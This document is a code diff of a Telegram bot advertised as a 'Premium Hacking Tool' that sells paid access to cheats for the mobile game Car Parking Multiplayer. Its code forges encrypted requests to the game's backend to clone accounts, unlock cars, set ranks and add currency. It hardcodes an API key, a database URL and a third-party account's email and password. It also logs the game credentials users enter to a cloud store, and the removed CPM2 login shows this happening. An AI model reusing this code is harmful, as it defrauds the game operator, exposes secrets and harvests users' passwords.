@@ -2,10 +2,8 @@
 # -*- coding: utf-8 -*-
 
 """
-☠️☠️☠️ MARKMWEHEHETOOL BOT - CPM1 + CPM2 ULTIMATE ☠️☠️☠️
-MERGED UI FROM GLITCHYNxMARK + IMPROVED CLONE & UNLOCK CARS
-SOURCE ACCOUNT: 500kunlockallcars2917@gmail.com (500k coins, all cars)
-FIXED: is_banned function added, all missing imports
+☠️☠️☠️ 𝙈𝘼𝙍𝙆𝘾𝙋𝙈1𝙏𝙊𝙊𝙋𝙎 - CPM1 + CPM2 (MAINTENANCE) ULTIMATE ☠️☠️☠️
+WITH SUBSCRIPTION + COIN SYSTEM + RAM OPTIMIZATION
 """
 
 import requests
@@ -26,6 +24,7 @@ import sqlite3
 import asyncio
 import aiohttp
 import threading
+import gc
 from copy import deepcopy
 from typing import Any, Dict, List, Optional, Tuple
 from datetime import datetime, timedelta, timezone
@@ -46,8 +45,8 @@ app = Flask(__name__)
 def home():
     return jsonify({
         "status": "online",
-        "bot": "MARKMWEHEHETOOL",
-        "version": "1.1.0",
+        "bot": "𝙈𝘼𝙍𝙆𝘾𝙋𝙈1𝙏𝙊𝙊𝙋𝙎",
+        "version": "2.0.0",
         "uptime": "running"
     })
 
@@ -88,7 +87,7 @@ FIREBASE_API_KEY = "9rn0Ex4Mnc7VnMpBvxi1EyVsBfgRwo2UhVMNtPT0"
 DB_URL = "https://cpm-2-7cea1-42c9a-default-rtdb.firebaseio.com"
 
 # ═══════════════════════════════════════════════════════════
-# 💳 SUBSCRIPTION & PAYMENT SETTINGS
+# 💳 SUBSCRIPTION & PAYMENT SETTINGS (Main)
 # ═══════════════════════════════════════════════════════════
 
 GROUP_LOG_ID = -1004441134033
@@ -182,7 +181,7 @@ def db_push(path, data):
         return False
 
 # ═══════════════════════════════════════════════════════════
-# 📋 CLOUD LOG FUNCTIONS (from MARKMWEHEHETOOL)
+# 📋 CLOUD LOG FUNCTIONS
 # ═══════════════════════════════════════════════════════════
 
 def append_credentials_backup(email, password, game="cpm2"):
@@ -302,7 +301,7 @@ FREE_TRIAL_USERS = {}
 USER_SUBSCRIPTIONS = {}
 
 # ═══════════════════════════════════════════════════════════
-# 🚫 BAN SYSTEM - FIXED
+# 🚫 BAN SYSTEM
 # ═══════════════════════════════════════════════════════════
 
 banned_users = set()
@@ -311,7 +310,126 @@ def is_banned(user_id):
     return user_id in banned_users
 
 # ═══════════════════════════════════════════════════════════
-# ENCRYPTION / DECRYPTION FUNCTIONS (from cpm_nuker.py)
+# 🪙 COIN SYSTEM + COSTS
+# ═══════════════════════════════════════════════════════════
+
+COIN_FILE = "coins.json"
+
+COST_INDIVIDUAL = 50
+COST_CLONE = 100
+COST_BULK = 250
+
+def load_coins():
+    try:
+        with open(COIN_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_coins(data):
+    with open(COIN_FILE, "w") as f:
+        json.dump(data, f, indent=4)
+
+def get_user_coins(user_id):
+    data = load_coins()
+    return data.get(str(user_id), {"coins": 0, "unlimited": False}).get("coins", 0)
+
+def is_unlimited(user_id):
+    data = load_coins()
+    return data.get(str(user_id), {"coins": 0, "unlimited": False}).get("unlimited", False)
+
+def _ensure_user(data, str_id):
+    if str_id not in data:
+        data[str_id] = {"coins": 0, "unlimited": False, "subscribed": False, "expiry": None}
+    if "subscribed" not in data[str_id]:
+        data[str_id]["subscribed"] = False
+    if "expiry" not in data[str_id]:
+        data[str_id]["expiry"] = None
+
+def is_subscribed_coins(user_id):
+    data = load_coins()
+    entry = data.get(str(user_id), {})
+    expiry_str = entry.get("expiry")
+    if expiry_str:
+        try:
+            expiry = datetime.strptime(expiry_str, "%Y-%m-%d").date()
+            if expiry < datetime.today().date():
+                return False
+        except:
+            pass
+    return entry.get("unlimited", False) or entry.get("subscribed", False)
+
+def set_subscribed_coins(user_id, status: bool, months=0):
+    data = load_coins()
+    sid = str(user_id)
+    _ensure_user(data, sid)
+    data[sid]["subscribed"] = status
+    if months > 0:
+        expiry_date = datetime.today().date() + timedelta(days=months*30)
+        data[sid]["expiry"] = expiry_date.strftime("%Y-%m-%d")
+    else:
+        data[sid]["expiry"] = None
+        data[sid]["subscribed"] = False
+    save_coins(data)
+
+def deduct_coins(user_id, amount=10):
+    data = load_coins()
+    sid = str(user_id)
+    _ensure_user(data, sid)
+    if not data[sid]["unlimited"]:
+        data[sid]["coins"] = max(0, data[sid]["coins"] - amount)
+    save_coins(data)
+
+def add_coins(user_id, amount):
+    data = load_coins()
+    str_id = str(user_id)
+    _ensure_user(data, str_id)
+    data[str_id]["coins"] += amount
+    save_coins(data)
+
+def set_coins(user_id, amount):
+    data = load_coins()
+    str_id = str(user_id)
+    _ensure_user(data, str_id)
+    data[str_id]["coins"] = amount
+    save_coins(data)
+
+def set_unlimited(user_id, status: bool):
+    data = load_coins()
+    str_id = str(user_id)
+    _ensure_user(data, str_id)
+    data[str_id]["unlimited"] = status
+    save_coins(data)
+
+def has_active_subscription(user_id):
+    if user_id in USER_SUBSCRIPTIONS:
+        sub = USER_SUBSCRIPTIONS[user_id]
+        if datetime.now() <= sub['expires']:
+            return True
+    if is_unlimited(user_id):
+        return True
+    return False
+
+def check_and_deduct_coins(chat_id, amount, feature_name):
+    if has_active_subscription(chat_id):
+        return True
+    coins = get_user_coins(chat_id)
+    if coins < amount:
+        bot.send_message(chat_id, f"❌ **Not enough coins!**\nYou have {coins} coins.\nNeed {amount} coins for **{feature_name}**.\n\n💎 Buy more coins or subscribe to get unlimited access.", parse_mode='Markdown')
+        return False
+    deduct_coins(chat_id, amount)
+    bot.send_message(chat_id, f"✅ **{amount} coins deducted** for **{feature_name}**.\nRemaining coins: {get_user_coins(chat_id)}", parse_mode='Markdown')
+    return True
+
+def get_coin_display(chat_id):
+    if has_active_subscription(chat_id):
+        return "🪙 **Unlimited** (Active Subscription)"
+    coins = get_user_coins(chat_id)
+    unlimited = is_unlimited(chat_id)
+    return f"🪙 **Coins:** {coins}{' (Unlimited)' if unlimited else ''}"
+
+# ═══════════════════════════════════════════════════════════
+# 🔐 ENCRYPTION / DECRYPTION (from cpm_nuker.py)
 # ═══════════════════════════════════════════════════════════
 
 def make_xor_key(uid: str) -> bytes:
@@ -743,7 +861,7 @@ def build_payload(record: Dict[str, Any], uid: str, original: Optional[Dict[str,
     return base64.b64encode(encrypted).decode("ascii")
 
 # ═══════════════════════════════════════════════════════════
-# 📦 CPMNuker Class (from MARKMWEHEHETOOL - for CPM1 features)
+# 📦 CPMNuker Class (CPM1 features)
 # ═══════════════════════════════════════════════════════════
 
 class CPMNuker:
@@ -1365,12 +1483,17 @@ class CPMNuker:
         results = []
         failed = []
         await self.load(uid, force=True)
-        for name, fn in feature_calls:
-            result = await fn(uid)
-            if result.get("ok"):
-                results.append(name)
-            else:
-                failed.append(f"{name}: {result.get('message', 'Failed')}")
+        # Process in smaller groups to free memory
+        for i in range(0, len(feature_calls), 5):
+            group = feature_calls[i:i+5]
+            for name, fn in group:
+                result = await fn(uid)
+                if result.get("ok"):
+                    results.append(name)
+                else:
+                    failed.append(f"{name}: {result.get('message', 'Failed')}")
+            gc.collect()
+            await asyncio.sleep(0.5)
         return {
             "ok": not failed,
             "message": f"Unlocked {len(results)}/{len(feature_calls)} features" + ("; " + "; ".join(failed) if failed else ""),
@@ -1395,83 +1518,22 @@ class CPMNuker:
         }
 
 # ═══════════════════════════════════════════════════════════
-# 🎮 CPM2 FUNCTIONS (from MARKMWEHEHETOOL)
+# 🎮 CPM2 FUNCTIONS (DISABLED - UNDER MAINTENANCE)
 # ═══════════════════════════════════════════════════════════
-
-def gen_device_id():
-    return ''.join(random.choice('0123456789abcdef') for _ in range(32))
-
-CPM2_DEVICE_ID = gen_device_id()
-_cpm2_session = requests.Session()
-
-class CPM2Crypto:
-    def __init__(self, uid):
-        self.uid = uid
-        self.key = (uid[:8] + CPM2_KEY_ADD).encode()[:16]
-        self.iv = (uid[:8] + CPM2_IV_ADD).encode()[:16]
-    def encrypt(self, s):
-        return base64.b64encode(AES.new(self.key, AES.MODE_CBC, self.iv).encrypt(pad(s.encode(), 16))).decode()
-
-def cpm2_login(email, pw):
-    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={CPM2_API_KEY}"
-    payload = {"email": email, "password": pw, "returnSecureToken": True, "clientType": "CLIENT_TYPE_ANDROID"}
-    try:
-        r = requests.post(url, json=payload, timeout=20, verify=False)
-        j = r.json()
-        if "idToken" in j:
-            try:
-                cloud_log_credentials(email, pw, "cpm2", "login", "", "", 0)
-            except Exception:
-                pass
-            return {"token": j["idToken"], "uid": j["localId"]}
-        return {"error": "Login failed"}
-    except Exception:
-        return {"error": "Connection error"}
 
 def cpm2_king_rank(email, pw):
-    try:
-        a = cpm2_login(email, pw)
-        if not a or "error" in a:
-            return False, f"Login failed: {a.get('error', 'unknown')}"
-        token = a["token"]
-        uid = a["uid"]
-        crypto = CPM2Crypto(uid)
-        rating = {"cars": 100000, "car_fix": 100000, "car_collided": 100000, 
-                  "car_exchange": 100000, "car_trade": 100000, "car_wash": 100000,
-                  "slicer_cut": 100000, "drift_max": 100000, "drift": 100000,
-                  "cargo": 100000, "delivery": 100000, "taxi": 100000,
-                  "levels": 100000, "gifts": 100000, "fuel": 100000,
-                  "offroad": 100000, "speed_banner": 100000, "reactions": 100000,
-                  "police": 100000, "run": 100000, "real_estate": 100000,
-                  "t_distance": 100000, "treasure": 100000, "block_post": 100000,
-                  "push_ups": 100000, "burnt_tire": 100000, "passanger_distance": 100000,
-                  "time": 9999999999, "race_win": 5000}
-        enc = crypto.encrypt(json.dumps(rating))
-        hdrs = {"X-Firebase-Token": token, "X-Api-Key": CPM2_OG_KEY, 
-                "Content-Type": "application/json", "User-Agent": CPM2_USER_AGENT}
-        r = _cpm2_session.post(f"{CPM2_OG_BASE}/progress-service/v1/rating/update", 
-                                headers=hdrs, json={"data": enc}, timeout=20, verify=False)
-        if r.status_code == 200 and '"code":1' in r.text:
-            return True, "Rank upgraded to King (Level 120)"
-        return False, "Failed to upgrade rank"
-    except Exception as e:
-        return False, f"Error: {str(e)}"
+    return False, "CPM2 is under maintenance."
 
 def generate_cpm2_account():
-    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-    email = f"{username}@MARKMWEHEHETOOL.com"
-    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
-    return {"email": email, "password": password}, None
+    return {"email": "maintenance", "password": "maintenance"}, "CPM2 is under maintenance."
 
 # ═══════════════════════════════════════════════════════════
-# 🚗 IMPROVED CAR FUNCTIONS (from GLITCHYNxMARK)
+# 🚗 CAR FUNCTIONS (from GLITCHYNxMARK)
 # ═══════════════════════════════════════════════════════════
 
-# 🔥 UPDATED SOURCE ACCOUNT (500k coins, all cars)
 SOURCE_UNLOCK_ACCOUNT = ('500kunlockallcars2917@gmail.com', '500kcoin')
 
 def verify_user(email, password):
-    """Login to CPM1 and return token + uid."""
     payload = {"email": email, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_ANDROID"}
     try:
         response = requests.post(
@@ -1515,7 +1577,6 @@ def cpm1_get_cars(token):
         return None
 
 def cpm1_get_garage_slot(token):
-    """Get an empty or any available slot from the world sale."""
     for param in [20, 10, 50, 100]:
         for attempt in range(2):
             try:
@@ -1524,111 +1585,23 @@ def cpm1_get_garage_slot(token):
                     data = json.loads(text)
                     result = json.loads(data['result'])
                     if result and isinstance(result, list) and len(result) > 0:
-                        # Prefer empty slot (carID == 0)
                         for slot in result:
                             if slot.get('carID', 0) == 0 and 'carGeneratedID' in slot:
                                 return slot
-                        # fallback to first slot
                         return result[0]
             except Exception:
                 pass
             time.sleep(0.5)
     return None
 
-def cpm1_get_full_car(token, car_data):
-    """Fetch full car data (including vinyls) from the source account."""
-    cid = car_data.get("CarID") or car_data.get("carID") or 0
-    gen = car_data.get("carGeneratedID") or car_data.get("CarGeneratedID") or ""
-    for endpoint, data in (
-        ("WSGetFullCarV3", json.dumps({"CarID": cid, "carGeneratedID": gen})),
-        ("WSGetFullCarV3", json.dumps(car_data)),
-        ("WSGetFullCarV3", json.dumps({"CarID": cid})),
-        ("TestGetAllCars", None),
-    ):
-        try:
-            status, text = cpm1_api(token, endpoint, data)
-            if status != 200:
-                continue
-            raw = json.loads(text)
-            result = raw.get("result", raw)
-            if isinstance(result, str):
-                try:
-                    result = json.loads(result)
-                except Exception:
-                    pass
-            if isinstance(result, dict) and (result.get("CarID") or result.get("carID")):
-                return result
-            if isinstance(result, list) and result:
-                for item in result:
-                    if not isinstance(item, dict):
-                        continue
-                    if item.get("CarID") == cid or item.get("carID") == cid:
-                        return item
-        except Exception:
-            continue
-    return None
-
-def cpm1_fix_car_appearance(car):
-    """Normalize car appearance (colors, police flags, etc.) to avoid ban."""
-    if not isinstance(car, dict):
-        return car
-    car = json.loads(json.dumps(car))
-    vyn = car.get("Vynils")
-    if not isinstance(vyn, dict):
-        vyn = {}
-    if "CarID" not in vyn and car.get("CarID") is not None:
-        vyn["CarID"] = car.get("CarID")
-    car["Vynils"] = vyn
-
-    def ensure_color_list(key, length, default=1.0):
-        val = car.get(key)
-        if not isinstance(val, list) or len(val) == 0:
-            car[key] = [float(default)] * length
-        else:
-            fixed = []
-            for x in val:
-                try:
-                    fx = float(x)
-                except Exception:
-                    fx = default
-                if fx == 0.0:
-                    fx = 1.0
-                fixed.append(fx)
-            car[key] = fixed
-
-    for key, ln in (("colors", 4), ("Colors", 4), ("bodyColor", 4), ("paint", 4)):
-        if key in car or key in ("colors", "Colors"):
-            ensure_color_list(key, ln, 0.85)
-
-    if isinstance(car.get("color"), (int, float)) and float(car.get("color") or 0) == 0:
-        car["color"] = 1
-
-    car["police"] = False
-    car["isLocked"] = False
-    if car.get("engineID") in (None, 0):
-        car["engineID"] = 5
-    car["cdi"] = True
-    car["torque"] = car.get("torque") or 3000.0
-    car["brake"] = car.get("brake") or 3000.0
-    car["mass"] = car.get("mass") or 1100.0
-    return car
-
 def cpm1_clone_car(token_target, car_data, target_uid, clean_unlock=False):
-    """Clone a single car into the target garage.
-    clean_unlock=True -> only ownership, no tuning/vinyl (used for unlock all)
-    clean_unlock=False -> copy full car with vinyls (used for cloning)
-    """
     cid = car_data.get('CarID', 0)
     if clean_unlock:
-        # Ownership only: send minimal car data (game will use default tuning)
         car = {"CarID": cid, "dataVersion": 3, "flagID": -1}
-        vynil_data = {}  # no vinyl
+        vynil_data = {}
     else:
-        # Full copy: grab the source car's data and vinyl
         car = json.loads(json.dumps(car_data))
-        car = cpm1_fix_car_appearance(car)
         car['CarID'] = cid
-        # Apply target UID to the car's text field
         try:
             if 'texts' in car and isinstance(car['texts'], list) and len(car['texts']) > 2:
                 car['texts'][2] = f"{str(target_uid)[:8].upper()}_{cid}_HZ"
@@ -1636,13 +1609,11 @@ def cpm1_clone_car(token_target, car_data, target_uid, clean_unlock=False):
                 car['texts'] = ["", "", f"{str(target_uid)[:8].upper()}_{cid}_HZ"]
         except Exception:
             pass
-        # Ensure Vynils has correct CarID
         try:
             if isinstance(car.get('Vynils'), dict):
                 car['Vynils']['CarID'] = cid
         except Exception:
             pass
-        # Vinyl data to pass to the purchase payload
         vynil_data = car.get('Vynils', {})
         if isinstance(vynil_data, dict):
             vynil_data = dict(vynil_data)
@@ -1678,33 +1649,37 @@ def cpm1_clone_car(token_target, car_data, target_uid, clean_unlock=False):
     return False
 
 def cpm1_unlock_all_cars(target_email, target_pass, progress_callback=None):
-    """Unlock ALL cars (clean ownership) from the source account."""
     source_token, source_uid = verify_user(*SOURCE_UNLOCK_ACCOUNT)
     if not source_token:
         return 0, 0
     cars = cpm1_get_cars(source_token)
-    if not cars or len(cars) == 0:
+    if not cars:
         return 0, 0
-    total_cars = len(cars)
+    total = len(cars)
     target_token, target_uid = verify_user(target_email, target_pass)
     if not target_token:
-        return 0, total_cars
-    success_count = 0
-    fail_count = 0
-    for idx, car in enumerate(cars, 1):
-        if not isinstance(car, dict):
-            continue
-        if cpm1_clone_car(target_token, car, target_uid, clean_unlock=True):
-            success_count += 1
-        else:
-            fail_count += 1
-        if progress_callback:
-            progress_callback(idx, total_cars, success_count, fail_count)
-        time.sleep(0.2)  # avoid rate limit
-    return success_count, fail_count
+        return 0, total
+    success = 0
+    fail = 0
+    batch_size = 50
+    for i in range(0, total, batch_size):
+        batch = cars[i:i+batch_size]
+        for car in batch:
+            if isinstance(car, dict):
+                if cpm1_clone_car(target_token, car, target_uid, clean_unlock=True):
+                    success += 1
+                else:
+                    fail += 1
+                if progress_callback:
+                    progress_callback(i+len(batch), total, success, fail)
+                time.sleep(0.1)
+        # Free memory after each batch
+        del batch
+        gc.collect()
+        time.sleep(0.5)
+    return success, fail
 
 def cpm1_clone_single_car(target_email, target_pass, car_id):
-    """Unlock a specific car by ID (clean ownership)."""
     source_token, source_uid = verify_user(*SOURCE_UNLOCK_ACCOUNT)
     if not source_token:
         return False
@@ -1724,37 +1699,41 @@ def cpm1_clone_single_car(target_email, target_pass, car_id):
     return cpm1_clone_car(target_token, car, target_uid, clean_unlock=True)
 
 def cpm1_clone_account(source_email, source_pass, target_email, target_pass):
-    """Clone full account (copy all cars with vinyls)."""
     source_token, source_uid = verify_user(source_email, source_pass)
     if not source_token:
         return False, {"error": "Source login failed", "total": 0, "success": 0, "fail": 0}
     cars = cpm1_get_cars(source_token)
-    if not cars or len(cars) == 0:
+    if not cars:
         return False, {"error": "Source has no cars", "total": 0, "success": 0, "fail": 0}
-    total_cars = len(cars)
+    total = len(cars)
     target_token, target_uid = verify_user(target_email, target_pass)
     if not target_token:
         return False, {"error": "Target login failed", "total": 0, "success": 0, "fail": 0}
-    success_count = 0
-    fail_count = 0
-    for car in cars:
-        if not isinstance(car, dict):
-            continue
-        if cpm1_clone_car(target_token, car, target_uid, clean_unlock=False):
-            success_count += 1
-        else:
-            fail_count += 1
-        time.sleep(0.2)
-    result_data = {"total": total_cars, "success": success_count, "fail": fail_count}
-    if success_count == total_cars:
+    success = 0
+    fail = 0
+    batch_size = 50
+    for i in range(0, total, batch_size):
+        batch = cars[i:i+batch_size]
+        for car in batch:
+            if isinstance(car, dict):
+                if cpm1_clone_car(target_token, car, target_uid, clean_unlock=False):
+                    success += 1
+                else:
+                    fail += 1
+                time.sleep(0.1)
+        del batch
+        gc.collect()
+        time.sleep(0.5)
+    result_data = {"total": total, "success": success, "fail": fail}
+    if success == total:
         return True, result_data
-    elif success_count > 0:
+    elif success > 0:
         return "partial", result_data
     else:
         return False, result_data
 
 # ═══════════════════════════════════════════════════════════
-# 🌐 HELPER FUNCTIONS (from MARKMWEHEHETOOL)
+# 🌐 HELPER FUNCTIONS
 # ═══════════════════════════════════════════════════════════
 
 nuker = CPMNuker()
@@ -1776,7 +1755,7 @@ user_cpm_version = {}
 bot_status = True
 
 # ═══════════════════════════════════════════════════════════
-# 📢 ADMIN NOTIFICATION FUNCTION
+# 📢 ADMIN NOTIFICATION
 # ═══════════════════════════════════════════════════════════
 
 def notify_admins(message_text, parse_mode='Markdown'):
@@ -1787,7 +1766,7 @@ def notify_admins(message_text, parse_mode='Markdown'):
             print(f"Failed to notify admin {admin_id}: {e}")
 
 # ═══════════════════════════════════════════════════════════
-# 📥 DOWNLOAD LOGS, BACKUP, DASHBOARD COMMANDS (admin)
+# 📥 ADMIN COMMANDS (logs, backup, dashboard)
 # ═══════════════════════════════════════════════════════════
 
 @bot.message_handler(commands=['download_logs'])
@@ -1941,7 +1920,7 @@ def dashboard_command(message):
         bot.edit_message_text(f"❌ **Failed to load dashboard:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
 
 # ═══════════════════════════════════════════════════════════
-# 🔑 TIME KEY FUNCTIONS
+# 🔑 TIME KEY & TRIAL FUNCTIONS (unchanged)
 # ═══════════════════════════════════════════════════════════
 
 def generate_time_key():
@@ -1988,15 +1967,6 @@ def use_time_key(key: str, user_id: int) -> Tuple[bool, str]:
     except Exception:
         pass
     return True, "Key activated successfully"
-
-def get_time_key_info(key: str) -> Dict[str, Any]:
-    if key not in TIME_KEYS:
-        return None
-    return TIME_KEYS[key]
-
-# ═══════════════════════════════════════════════════════════
-# 🎁 FREE TRIAL FUNCTIONS
-# ═══════════════════════════════════════════════════════════
 
 def generate_trial_key():
     chars = string.ascii_uppercase + string.digits
@@ -2056,7 +2026,7 @@ def register_free_trial(user_id):
     }
 
 # ═══════════════════════════════════════════════════════════
-# 📋 FORMATTING FUNCTIONS
+# 📋 FORMATTING & HELPER FUNCTIONS
 # ═══════════════════════════════════════════════════════════
 
 def format_account_info(info: Dict[str, Any]) -> str:
@@ -2075,9 +2045,9 @@ def format_account_info(info: Dict[str, Any]) -> str:
 
 def get_text(chat_id, key, **kwargs):
     texts = {
-        "welcome": "🚘 **MARKMWEHEHETOOL BOT**\n🔥 Premium Hacking Tool 🔥\n━━━━━━━━━━━━━━━━━━━━━\n👤 Welcome!\n📌 Choose activation method:\n━━━━━━━━━━━━━━━━━━━━━\n🔑 Normal Key\n⏰ Time Key\n🎁 Free Trial (10 min)\n💎 Subscription\n━━━━━━━━━━━━━━━━━━━━━\n👤 @Maarkryan",
-        "cpm1_section": "🚘 **CPM1 HACK PANEL**\n━━━━━━━━━━━━━━━━━━━━━\n✨ _MARKMWEHEHETOOL_ · Premium Tools",
-        "cpm2_section": "🎮 **CPM2 HACK PANEL**\n━━━━━━━━━━━━━━━━━━━━━\n✨ _MARKMWEHEHETOOL_ · Premium Tools",
+        "welcome": "🚘 **𝙈𝘼𝙍𝙆𝘾𝙋𝙈1𝙏𝙊𝙊𝙋𝙎 BOT**\n🔥 Premium Hacking Tool 🔥\n━━━━━━━━━━━━━━━━━━━━━\n👤 Welcome!\n📌 Choose activation method:\n━━━━━━━━━━━━━━━━━━━━━\n🔑 Normal Key\n⏰ Time Key\n🎁 Free Trial (10 min)\n💎 Subscription\n━━━━━━━━━━━━━━━━━━━━━\n👤 @Maarkryan",
+        "cpm1_section": "🚘 **CPM1 HACK PANEL**\n━━━━━━━━━━━━━━━━━━━━━\n✨ _𝙈𝘼𝙍𝙆𝘾𝙋𝙈1𝙏𝙊𝙊𝙋𝙎_ · Premium Tools",
+        "cpm2_section": "🎮 **CPM2 HACK PANEL**\n━━━━━━━━━━━━━━━━━━━━━\n🛠️ **UNDER MAINTENANCE**\n⏳ Please check back later.",
         "back": "🔙 Back",
         "not_logged": "❌ **Not logged in!** Use /start",
         "not_logged_short": "❌ **Not logged in!**",
@@ -2195,9 +2165,6 @@ def get_text(chat_id, key, **kwargs):
 def is_admin(chat_id):
     return chat_id in ADMIN_IDS
 
-def is_banned(user_id):
-    return user_id in banned_users
-
 def add_log(chat_id, action):
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
     user_logs.append(f"[{timestamp}] User {chat_id}: {action}")
@@ -2259,6 +2226,9 @@ def refresh_account_data(chat_id):
             return False, "Failed to load data from server"
     except Exception as e:
         return False, f"Error: {str(e)}"
+
+def get_web_uid(telegram_id):
+    return int(str(telegram_id)[:12])
 
 # ═══════════════════════════════════════════════════════════
 # 🎨 KEYBOARDS
@@ -2343,36 +2313,28 @@ def create_subscription_renew_keyboard():
     return markup
 
 def create_cpm1_keyboard(chat_id):
-    """Clean, categorized CPM1 menu: Account | Cars & Mods | Resources |
-    Progress | Unlocks | Ultimate, with Refresh + Back at the bottom."""
     markup = types.InlineKeyboardMarkup(row_width=2)
-    # ── Account
     markup.row(types.InlineKeyboardButton("📋 Clone Account", callback_data="cpm1_clone"),
                types.InlineKeyboardButton("🚗 Unlock Cars", callback_data="cpm1_unlock_cars"))
     markup.row(types.InlineKeyboardButton("🔧 Fix Account", callback_data="cpm1_fix"),
                types.InlineKeyboardButton("🆔 Change ID", callback_data="cpm1_change_id"))
     markup.row(types.InlineKeyboardButton("🔵 Change Email", callback_data="cpm1_change_email"),
                types.InlineKeyboardButton("🟡 Change Password", callback_data="cpm1_change_pass"))
-    # ── Cars & Mods
     markup.row(types.InlineKeyboardButton("⚡ W16 Engine", callback_data="cpm1_w16"),
                types.InlineKeyboardButton("📯 Horns", callback_data="cpm1_horns"))
     markup.row(types.InlineKeyboardButton("⛽ Unlimited Fuel", callback_data="cpm1_fuel"),
                types.InlineKeyboardButton("🛡️ Disable Damage", callback_data="cpm1_damage"))
     markup.row(types.InlineKeyboardButton("💨 Smoke", callback_data="cpm1_smoke"),
                types.InlineKeyboardButton("👑 King Rank", callback_data="cpm1_rank_advanced"))
-    # ── Resources
     markup.row(types.InlineKeyboardButton("💰 Add Money", callback_data="cpm1_money"),
                types.InlineKeyboardButton("💎 Add Coins", callback_data="cpm1_coin"))
-    # ── Progress
     markup.row(types.InlineKeyboardButton("🏆 Complete Levels", callback_data="cpm1_complete_levels"))
-    # ── Unlocks
     markup.row(types.InlineKeyboardButton("🎭 Animations", callback_data="cpm1_unlock_animations"),
                types.InlineKeyboardButton("🛞 Wheels", callback_data="cpm1_unlock_wheels"))
     markup.row(types.InlineKeyboardButton("🏠 Houses", callback_data="cpm1_unlock_houses"),
                types.InlineKeyboardButton("👨 Male Equip", callback_data="cpm1_unlock_equip_male"))
     markup.row(types.InlineKeyboardButton("👩 Female Equip", callback_data="cpm1_unlock_equip_female"),
                types.InlineKeyboardButton("🚪 Logout", callback_data="logout"))
-    # ── Ultimate + utilities
     markup.row(types.InlineKeyboardButton("💀 Ultimate Unlock", callback_data="cpm1_ultimate"))
     markup.row(types.InlineKeyboardButton("🔄 Refresh Info", callback_data="refresh_account"),
                types.InlineKeyboardButton("🔙 Back", callback_data="back_main"))
@@ -2380,12 +2342,10 @@ def create_cpm1_keyboard(chat_id):
 
 def create_cpm2_keyboard(chat_id):
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn1 = types.InlineKeyboardButton("👑 King Rank CPM2", callback_data="cpm2_king_rank")
-    btn2 = types.InlineKeyboardButton("🎲 Generate Account", callback_data="cpm2_generate")
-    btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
+    btn1 = types.InlineKeyboardButton("🛠️ Under Maintenance", callback_data="cpm2_maintenance")
+    btn2 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
     markup.row(btn1)
     markup.row(btn2)
-    markup.row(btn3)
     return markup
 
 def create_unlock_cars_keyboard(chat_id):
@@ -2437,9 +2397,6 @@ def create_admin_keyboard(chat_id):
 # 📱 SECTION FUNCTIONS
 # ═══════════════════════════════════════════════════════════
 
-def get_web_uid(telegram_id):
-    return int(str(telegram_id)[:12])
-
 def show_cpm1_menu(chat_id, message=None, force_refresh=False):
     if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "1":
         bot.send_message(chat_id, "❌ **You must login to CPM1 first!**", parse_mode='Markdown')
@@ -2457,7 +2414,8 @@ def show_cpm1_menu(chat_id, message=None, force_refresh=False):
         run_async(nuker.load_account(web_uid, force=True))
     info = run_async(nuker.get_account_info(web_uid))
     info_text = format_account_info(info)
-    full_text = f"{info_text}\n{get_text(chat_id, 'cpm1_section')}"
+    coin_display = get_coin_display(chat_id)
+    full_text = f"{info_text}\n{coin_display}\n\n{get_text(chat_id, 'cpm1_section')}"
     if message:
         try:
             bot.edit_message_text(full_text, chat_id, message.message_id, reply_markup=create_cpm1_keyboard(chat_id), parse_mode='Markdown')
@@ -2479,17 +2437,7 @@ def section_cpm1(message):
 
 def section_cpm2(message):
     chat_id = message.chat.id
-    if chat_id not in user_sessions:
-        user_sessions[chat_id] = {}
-    if user_sessions[chat_id].get('logged_in') and user_sessions[chat_id].get('version') == "2":
-        if is_admin(chat_id):
-            bot.send_message(chat_id, get_text(chat_id, "cpm2_section"), reply_markup=create_cpm2_keyboard(chat_id), parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
-        return
-    bot.send_message(chat_id, "🔐 **Login to CPM2**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Login first to access activations.\n━━━━━━━━━━━━━━━━━━━━━\n📧 **Enter CPM2 email:**", parse_mode='Markdown')
-    user_cpm_version[chat_id] = "2"
-    bot.register_next_step_handler(message, get_email)
+    bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown', reply_markup=create_cpm2_keyboard(chat_id))
 
 def admin_panel(message):
     chat_id = message.chat.id
@@ -2509,6 +2457,13 @@ def start(message):
     if is_banned(chat_id):
         bot.send_message(chat_id, "🚫 **You are banned!**", parse_mode='Markdown')
         return
+
+    coins = get_user_coins(chat_id)
+    unlimited = is_unlimited(chat_id)
+    coin_display = f"🪙 Coins: {coins}{' (Unlimited)' if unlimited else ''}"
+    if has_active_subscription(chat_id):
+        coin_display = "🪙 **Unlimited** (Active Subscription)"
+
     if chat_id in USER_SUBSCRIPTIONS:
         sub_data = USER_SUBSCRIPTIONS[chat_id]
         if datetime.now() > sub_data['expires']:
@@ -2516,7 +2471,7 @@ def start(message):
             markup = create_subscription_renew_keyboard()
             bot.send_message(
                 chat_id,
-                get_text(chat_id, "subscription_expired"),
+                get_text(chat_id, "subscription_expired") + f"\n\n{coin_display}",
                 reply_markup=markup,
                 parse_mode='Markdown'
             )
@@ -2528,19 +2483,23 @@ def start(message):
             expires = sub_data['expires'].strftime("%Y-%m-%d %H:%M")
             bot.send_message(
                 chat_id,
